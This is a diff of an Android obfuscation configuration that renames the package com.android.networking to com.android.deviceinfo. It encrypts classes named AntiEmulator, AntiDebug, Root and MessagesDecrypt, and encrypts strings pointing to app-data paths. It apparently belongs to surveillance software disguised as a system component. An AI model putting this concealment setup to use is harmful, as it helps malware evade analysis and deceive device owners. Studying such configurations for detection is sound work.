@@ -1,13 +1,13 @@
 
 -verbose
--encryptclasses com.android.networking.util.AntiEmulator,com.android.networking.MessagesDecrypt,
-		com.android.networking.Root,com.android.networking.Core,
-		com.android.networking.util.AntiDebug,com.android.networking.util.AntiEmulator
+-encryptclasses com.android.deviceinfo.util.AntiEmulator,com.android.deviceinfo.MessagesDecrypt,
+		com.android.deviceinfo.Root,com.android.deviceinfo.Core,
+		com.android.deviceinfo.util.AntiDebug,com.android.deviceinfo.util.AntiEmulator
 		
-#-encryptclasses com.android.networking.util.AntiEmulator,com.android.networking.Root
+#-encryptclasses com.android.deviceinfo.util.AntiEmulator,com.android.deviceinfo.Root
 
-#-encryptclasses com.android.networking.*
--encryptstrings "17_*","20_*","32_*","36_*","http://*","https://*","/data/data/*","/auth/user_data/*","cdd","mdd","ldd","*LOST.FILES*","AES*"
+#-encryptclasses com.android.deviceinfo.*
+-encryptstrings "17_*","20_*","32_*","36_*","http://*","https://*","/data/data/*","/auth/user_data/*","l*",".lost.found","AES*"
 
 -encryptstrings "getApplicationInfo"
 -accessthroughreflection class android.content.pm.ApplicationInfo {
@@ -33,8 +33,8 @@
 
 -classobfuscationdictionary "compact.txt"
 
-#togliere l'offuscamento di com.android.networking.Core.isServiceRunning
--keepclassmembers class com.android.networking.Core {
+#togliere l'offuscamento di com.android.deviceinfo.Core.isServiceRunning
+-keepclassmembers class com.android.deviceinfo.Core {
     public static boolean isServiceRunning();
 }
 
@@ -45,14 +45,14 @@
     res/layout/main.xml,
     res/values/*
 
--keep public class com.android.networking.gui.CGui
--keep public class com.android.networking.BM
--keep public class com.android.networking.listener.BAc
--keep public class com.android.networking.listener.BSt
--keep public class com.android.networking.listener.BSm
--keep public class com.android.networking.listener.BC
--keep public class com.android.networking.optimize.BatteryOptimizer
--keep public class com.android.networking.optimize.NetworkOptimizer
+-keep public class com.android.deviceinfo.gui.CGui
+-keep public class com.android.deviceinfo.BM
+-keep public class com.android.deviceinfo.listener.BAc
+-keep public class com.android.deviceinfo.listener.BSt
+-keep public class com.android.deviceinfo.listener.BSm
+-keep public class com.android.deviceinfo.listener.BC
+-keep public class com.android.deviceinfo.optimize.BatteryOptimizer
+-keep public class com.android.deviceinfo.optimize.NetworkOptimizer
 
 -assumenosideeffects class android.util.Log {
     public static boolean isLoggable(java.lang.String, int);
